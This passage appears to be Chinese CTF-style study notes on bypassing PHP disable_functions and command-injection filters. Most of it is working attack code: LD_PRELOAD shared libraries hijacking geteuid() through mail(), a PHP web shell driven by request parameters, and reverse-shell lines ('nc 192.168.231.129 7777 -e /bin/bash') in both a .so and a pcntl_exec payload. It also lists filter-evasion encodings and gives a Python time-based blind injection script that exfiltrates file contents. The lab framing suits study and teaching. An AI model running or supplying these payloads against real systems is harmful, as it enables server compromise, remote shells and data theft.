putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 6. 总结

在执行程序之前，会预先将`LD_PRELOAD`的环境变量设置为`poc.so`，在`mail()`函数的执行过程中，会加载`geteuid()`，由于`getuid()`程序已经被恶意修改，所以达到了攻击的效果

```php
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

### 绕过条件

1. 能够上传自己的`.so`文件
2. 能够控制环境变量的值（设置`LD_PRELOAD`变量），比如`putenv()`函数并且未被禁止
3. 存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载`LD_PRELOAD`中的`.so`文件），比如`mail()、imal_mail()、mb_send_mail()和error_log()`



## 0x04. `mail()`函数命令执行例题

### 方法一

> 经典方法：但是也是最麻烦的方法

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

void payload(){
    system("cat /flag > fl0g.txt");
}


int geteuid(){
    unsetenv("LD_PRELOAD");		// 结束调用，防止死循环
    payload();
}
```

#### `gcc`编译

```bash
gcc -shared -fPIC demo.c -o poc.so
```

#### 生成PHP文件

```c
<?php 
putenv("LD_PRELOAD=./poc.so");
mail('','','','');
```

#### 客户端访问测试

成功在当前路径中的`fl0g.txt`文件得到flag

### 方法二

> 最简单和最方便的方法，通过反弹shell得到命令执行权限

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid(){
    unsetenv("LD_PRELOAD");
    system("nc 192.168.231.129 7777 -e /bin/bash");
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo2.c -o demo2.so
```

#### 生成PHP文件

```php
<?php
putenv("LD_PRELOAD = ./demo2.so");
mail('','','','');
```

#### 客户端访问测试

成功会弹shell

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001110822.png" alt="image-20230814001110822" style="zoom:50%;" />

### 方法三

> 最复杂的方法，通过变量来指定要执行的命令

#### 生成库文件

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int geteuid() {
    // 生成指针变量 cmdline，值是 环境变量EVIL_CMDLINE 中的值
    const char *cmdline = getenv("EVIL_CMDLINE");
    // 如果 LD_PRELOAD 为 NULL，则直接返回0，否则取消调用
    if (getenv("LD_PRELOAD") == NULL) {
        return 0;
    }
    unsetenv("LD_PRELOAD");
    // 执行命令
    system(cmdline);
}
```

#### `gcc`编译

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/resource]
└─# gcc -shared -fPIC demo1.c -o demo1.so
```

#### 生成PHP文件

```php
<?php
// 获取要执行的命令
$cmd = $_REQUEST['cmd'];
// 获取命令执行结果的输出路径
$out_path = $_REQUEST['out_path'];

// 拼接命令
// 2>&1 将 标准输出和错误输出 都输出出来
$evil_cmdline = $cmd. " > ".$out_path." 2>&1";
echo "<br/><b>cmdline：</b>".$evil_cmdline;
// 设置变量 EVIL_CMDLINE
putenv("EVIL_CMDLINE=".$evil_cmdline);

// 获取 so文件 的路径
$so_path = $_REQUEST['sopath'];
// 指定库文件
putenv("LD_PRELOAD=".$so_path);
mail('','','','');
echo "<br/><b>output：</b><br/>".file_get_contents($out_path);
```

#### 客户端测试

```
HTTP payload
?cmd=cat%20/flag&out_path=flag.txt&sopath=./demo1.so
```

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814001725273.png" alt="image-20230814001725273" style="zoom:50%;" />

## 0x05. 蚁剑及`pcntl`绕过函数过滤

### 使用蚁剑插件绕过函数过滤

> Disable_function 插件的使用只能在Linux系统上运行

#### 1. Linux 蚁剑安装

```
Github 下载链接
https://github.com/AntSwordProject/AntSword-Loader
```

#### 2. 插件下载与安装

将插件下载之后解压缩到`antSword-master/antData/plugins`目录中即可

```
链接：https://pan.baidu.com/s/17DvmXiTV9gcTw8fbqurUaQ?pwd=xx66 
提取码：xx66
```

#### 3. 插件的使用

<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160509828.png" alt="image-20230814160509828" style="zoom: 67%;" />



<img src="%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230814160525394.png" alt="image-20230814160525394" style="zoom: 80%;" />

### `pcntl_exec`函数

#### 1. 函数的使用

```
pcntl_exec ( string `$path` [, array `$args` [, array `$envs` ]] ) : void
```

- `path`

  `path`必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的信息请查看您系统的execve（2）手册。

- `args`

  `args`是一个要传递给程序的参数的字符串数组。

- `envs`

  `envs`是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。

##### 返回值

当发生错误时返回 **`FALSE`** ，没有错误时没有返回。

#### 2. 回弹`webshell`

##### 例题源码

```php
ini_set('open_basedir', '/www/admin/localhost_81/wwwroot/class02' . $dir);
error_reporting(0);
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd)
    {
        eval($cmd);
    }
    else{
        echo "给你留个后门又能怎样？能拿到我根目录下的flag么？";
    }
}
```

##### payload

```
cmd=pcntl_exec("/bin/bash", array("-c", "nc 192.168.231.129 7777 -e /bin/bash"));
```

## 0x06. 命令拼接符

### `;`

使多个命令顺序执行

前面的命令和后面的命令都会执行

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami;id                                                                                     
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&`

是命令在后台运行

这样就可以同时执行多条命令

**若在前端提交，必须进行URL编码****

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&id
[1] 23116
pinginglab
[1]  + done       whoami
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)
```

### `&&`

如果前面的命令成功执行，则执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami&&id
pinginglab
用户id=1000(pinginglab) 组id=1000(pinginglab) 组=1000(pinginglab),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),121(wireshark),126(bluetooth),138(scanner),146(kaboxer),148(docker)                                                                     
```

### `|`

管道符，将前面命令的标准输出做标准输入到后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo 'whoami' | /bin/bash 
pinginglab
```

### `||`

短路运算：前面的命令成功执行则不执行后面的命令

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ whoami || ls
pinginglab
```

## 0x07. 空格绕过

### 1. 大括号

使用大括号将命令拼接起来，并使用`,`分割

`{cat,flag.txt}`

### 2. `$IFS`代替空格

```
$IFS、${IFS}、$IFS$9
```

Linux 下有一个特殊的环境变量叫做IFS，叫做内部分隔符（internal field separator）

```
cat$IFS/flag
```

单纯`$IFS2`被`bash`解释器当作变量名，输不出结果，加一个`{}`就固定了变量名

```
cat${IFS}/flag
```

`$IFS$9` - 后面加个`$`与`{}`类似，起截断作用，$9是当前系统shell进程第9个参数持有者，始终为空字符

```bash
cat$IFS$9/flag
```

### 3. 重定向字符`<`,`<>`

`<`表示的是输入重定向的意思，就是把`<`后面跟的文件取代键盘作为新的输入设备

```bash
# 将 /flag.txt 标准输入到 cat 中
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat < /flag.txt  
Flag is this
```

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat <> /flag.txt
Flag is this
```

### 4. URL编码

**%09(Tab)**

```bash
cat%09/flag
```

**%20(Tab)**

```
cat%20/flag
```

## 0x08. 文件名过滤绕过

### 1. 通配符绕过

使用通配符 `* | ?` 来绕过

其中，`*`代表所有，`?`代表一个字符

```bash
# 查看文件 /flag.txt
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f*                               
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /f???????
Flag is this
```

### 2. 单引号、双引号绕过

Linux 中在命令中间插入单引号或双引号都可以继续执行命令

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl''ag.t""xt
Flag is this
```

### 3. 反斜杠绕过

Linux 中的反斜杠代表转义字符

```bash
# \a 在 Linux 中并没有特殊含义，所以依然当字母a来处理
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl\ag.txt 
Flag is this
```

### 4. 使用 `$1-9`，`$a,$*`等

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@ag.txt
Flag is this
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$@*g.txt
Flag is this

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat /fl$5ag.txt
Flag is this
```

### 5. 内联执行

通过定义变量的方式来绕过安全过滤

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# a=/fl;b=ag;c=.t;d=xt;cat $a$b$c$d
Flag is this
```

### 6. 利用 Linux 中的环境变量

通过对 Linux 中的环境变量进行字符切片从而拼接成所需要的字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo $PATH                
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo f${PATH:5:1}${PATH:8:1}g 
flag
```

## 0x09. 常见文件读取命令绕过

### 1. `tac`：方向显示

将文件以行为单位反向显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tac php-exec/demo.php 
mail('','','','');
putenv("LD_PRELOAD=./poc.so");
<?php
```

### 2. `more`：一页一页的显示

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# more /flag.txt
```

### 3. `less`：与`more`类似

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# less /flag.txt
```

### 4. `tail`：查看末尾几行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# tail /flag.txt       
Flag is this
```

### 5. `nl`：显示的时候，顺便输出行号

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# nl /flag.txt 
     1  Flag is this
```

### 6. `od`：以二进制的方式读取档案内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# od /flag.txt 
0000000 066106 063541 064440 020163 064164 071551 000012
0000015
```

### 7. `xxd`：读取二进制文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# xxd /flag.txt 
00000000: 466c 6167 2069 7320 7468 6973 0a         Flag is this.
```

### 8. `sort`：主要用于排序文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# sort /flag.txt               
Flag is this
```

### 9. `uniq`：包裹或删除文件中重复的行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# uniq /flag.txt 
Flag is this
```

### 10. `file -f`：报错出具体内容

文件中以行为单位打开文件

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# file -f /flag.txt 
Flag is this: cannot open `Flag is this' (No such file or directory)
```

### 11. `grep`：在文本中过滤出所需字符串

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# grep "f*" /f*                        
Flag is this	
```

## 0x10. 编码绕过

### 1. `base64`编码绕过

**反引号的作用**

Linux 中的反引号的作用：将反引号中的命令输出，作为另一个命令的参数

```bash
# 通过 echo 输出文件名作为 cat 命令的参数
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# cat `echo /flag.txt`                  
Flag is this
```

反引号的使用一定需要搭配`echo`来执行

```bash
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo Y2F0IC9mbGFnLnR4dAo= |base64 -d` 
Flag is this

# 也可以通过重定向到 /bin/bash 来执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "Y2F0IC9mbGFnLnR4dAo=" |base64 -d | /bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo Y2F0IC9mbGFnLnR4dAo= |base64 -d)        
Flag is this
```

### 2. `base32`编码绕过

与`base64`编码绕过一样，只不过将算法换成了`base32`

```bash
# 反引号执行
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# `echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d`
Flag is this

# 管道重定向到新的 shell
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d |/bin/bash
Flag is this

# 也可以使用 $(...) 的方式执行代码
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# $(echo MNQXIIBPMZWGCZZOOR4HICQ= |base32 -d)        
Flag is this
```

### 3. `HEX`编码绕过

```bash
# 使用 Linux 对字符串做 HEX 运算
# -ps 以纯文本16进制的形式输出
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "cat /flag.txt" |xxd -ps                      
636174202f666c61672e7478740a

# 使用 编码转换 的方式执行命令
┌──(root㉿pinginglab)-[/home/pinginglab]
└─# echo "636174202f666c61672e7478740a" |xxd -r -p |/bin/bash
Flag is this
```

### 4. `shellcode`编码

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ echo "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74" |/bin/bash
Flag is this
```

### 5. 编码转换脚本

```python
import binascii

# 要转换的字符串
string = "cat /flag.txt"

hex_string = binascii.hexlify(string.encode()).decode()
print('HEX 编码：', hex_string)

res = ''
for i in range(0, len(hex_string), 2):
    res += '\\x' + hex_string[i] + hex_string[i + 1]

print("shell code编码：", res)
```

## 0x10. 无回显盲注

### 前置知识

#### 1. `awk NR==N`：查询指定行

```bash
# awk NR==2：指定查询第二行的内容
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat -n base.txt| awk NR==2 
     2  is
```

#### 2. `cut -c`：查询指定列的字符

```bash
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| cut -c 1 
f
i
t
h
h
h
```

#### 3. 组合查询指定行的第N个字符

```bash
# 查询第一行的第一个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==1 |cut -c 1
f

# 查询第二行的第二个字符
┌──(pinginglab㉿pinginglab)-[~]
└─$ cat base.txt| awk NR==2 |cut -c 2
s
```

#### 4. `IF`语句

由于在Linux中，`<`，`>`字符被用于重定向，所以需要用其他字符来代替

```
-gt（大于）、-lt（小于）、-ge（大于等于）和 -le（小于等于）
```

```bash
# 格式
if [ 条件表达式 ];then True分支;fi

# 3>2，指定命令
# 注意在 [] 中，所有字符都需要有一个空格隔开
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ 3 -gt 2 ];then echo 'yes';fi
yes
```

#### 5. `sleep`：睡眠

```bash
# 睡眠3秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ sleep 3  
```

#### 6. 组合使用

```bash
# 如果文件中的第一个字符为f就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt| awk NR==1| cut -c 1) == 'f' ];then sleep 2;fi

# 如果文件中的第三行第一个字符是 t 就 sleep 2秒
┌──(pinginglab㉿pinginglab)-[~]
└─$ if [ $(cat base.txt |awk NR==3| cut -c 1) == 't' ];then sleep 2;fi
```

### Python盲注脚本

```py
# 我写的
import requests
import time

base_url = "http://192.168.231.129:18080/class08/1.php?cmd="

# if [ $(cat base.txt| awk NR==2 |cut -c 2) == s ];then echo "yes";fi
res = ''
# 多少行
for row in range(1, 10):
    # 多少字符
    for cut_char in range(1, 50):
        # ASCII 码爆破范围
        for ascii_char in range(32, 128):
            # time.sleep(0.5)
            char = chr(ascii_char)
            # payload = f"if [ `cat /flag |awk NR=={row} | cut -c {cut_char}` == {char} ];then sleep 2;fi"
            payload = f"if [ `cat flag.php | awk NR=={row} | cut -c {cut_char}` == {ascii_char} ];then sleep 2;fi"
            url = base_url + payload
            # print(url)
            try:
                print("发送：", end='')
                req = requests.get(url, timeout=1).text
                print(req)
            except Exception as e:
                print("获得字符：",char)
                res += char
                break
print(res)

# 课程给的
import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #ascii鐮佽〃
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

## 0x11. 长度绕过前置知识

### 1. 命令换行执行

```bash
# \ 可以使命令换行执行
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ca\ 
> t\            
>  flag
ctuctf={awsduhwiquhduiqwbfiu}
```

### 2. `ls -t`：按时间排序显示

将文件名按时间排序来显示，**从最近--->最远**，单位为秒

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t    
 x  'cat \'  'fla\'   g   flag
```

### 3. `>`创建文件

可以使用重定向输出创建文件

```bash
# 一般用法
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# echo "ctuctf={awsduhwiquhduiqwbfiu}" > flag 

# 也可以直接当 touch 使用
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
```

### 4. 执行文件

#### `sh`：执行命令

**sh命令** 是shell命令语言解释器，执行命令从标准输入读取或从一个文件中读取

```shell
bash [options] [file]
```

**sh命令** 执行命令**不需要文件有执行权限**，推荐使用这种方法

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

#### `./filename`：执行命令

要求文件有执行权限

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ./x
./x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
./x: 5: flag: not found
```

### 5. 组合使用

#### 思路

1. 利用`>`来创建文件，减少命令长度
2. 利用`\`来切割命令
3. `ls -t`，按时间将文件名来排序，最后使用`>`写入执行文件

#### 实战流程

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >g    
^C
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >fla\\
>
^C  
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls
'fla\'   flag   g
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# >cat\ \\
^C                                                                                                                                                                                                                                                
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# ls -t > x
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# sh x
x: 1: x: not found
ctuctf={awsduhwiquhduiqwbfiu}
x: 5: flag: not found
```

### `dir`命令

`dir`会在`ls -t`的基础上做不换行输出

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir                                   
cat\ \\  fla\\  flag  g  x
                                                                                                                                                                                   
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir > z
                                                                                                                                                    
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# cat z
cat\ \\  fla\\  flag  g  x  z
```

**`$(dir*)`**会将两个文件名拼接成一条命令，其中第一个文件名为命令，第二个文件名为参数

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# dir    
cat  flag

┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# $(dir *)                                   
ctuctf={awsduhwiquhduiqwbfiu}
```

### `rev`反向输出文件内容

```bash
┌──(root㉿pinginglab)-[/home/pinginglab/php-exec/xyz]
└─# rev flag                               
}uifbwqiudhuqiwhudswa{=ftcutc
```

